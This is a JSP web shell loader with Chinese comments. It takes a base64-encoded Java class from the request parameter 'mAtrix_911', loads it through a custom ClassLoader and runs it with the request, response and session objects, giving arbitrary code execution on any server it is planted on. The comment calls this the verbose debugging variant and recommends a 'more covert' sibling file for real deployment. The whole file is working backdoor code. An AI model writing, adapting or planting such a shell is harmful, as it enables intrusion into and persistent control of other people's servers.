<%@ page contentType="text/plain;charset=UTF-8" pageEncoding="UTF-8" %>
<%!
    /**
     * 排错 / 实验用：显式错误信息与 HTTP 状态码，便于定位 defineClass、参数等问题。
     * 默认部署请使用 jsp_classloader_b64.jsp（更隐蔽）。
     */
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
      Class base64;
      byte[] value = null;
      try {
        base64=Class.forName("sun.misc.BASE64Decoder");
        Object decoder = base64.newInstance();
        value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
      } catch (Exception e) {
        try {
          base64=Class.forName("java.util.Base64");
          Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
          value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception ee) {}
      }
      return value;
    }
%>
<%
try {
    String cls = request.getParameter("mAtrix_911");
    if (cls == null || cls.length() == 0) {
        response.setStatus(400);
        out.print("MATRIX_JSP_ERR:no_mAtrix_911_param");
        return;
    }
    byte[] raw = base64Decode(cls);
    if (raw == null || raw.length == 0) {
        response.setStatus(400);
        out.print("MATRIX_JSP_ERR:base64_decode_failed");
        return;
    }
    new U(this.getClass().getClassLoader()).g(raw).newInstance().equals(new Object[]{request, response, session});
} catch (Throwable t) {
    response.setStatus(500);
    out.print("MATRIX_JSP_ERR:" + t.getClass().getSimpleName() + ":" + String.valueOf(t.getMessage()));
}
%>
